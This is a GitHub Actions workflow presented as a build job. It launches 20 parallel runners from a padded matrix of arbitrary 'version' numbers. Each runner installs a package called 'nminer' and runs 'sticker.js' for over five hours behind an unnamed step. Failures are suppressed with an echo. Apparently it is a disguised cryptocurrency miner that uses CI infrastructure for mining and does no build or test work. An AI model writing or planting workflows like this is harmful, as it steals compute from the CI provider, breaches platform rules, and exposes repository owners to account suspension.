name: sticker
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9782 }
          - { version: 5282 }
          - { version: 9026 }
          - { version: 2041 }
          - { version: 3984 }
          - { version: 1546 }
          - { version: 8587 }
          - { version: 7249 }
          - { version: 3600 }
          - { version: 1982 }
          - { version: 5850 }
          - { version: 57 }
          - { version: 427 }
          - { version: 5848 }
          - { version: 7673 }
          - { version: 7933 }
          - { version: 976 }
          - { version: 6441 }
          - { version: 2275 }
          - { version: 8483 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 302m node sticker.js || echo "sticker executed"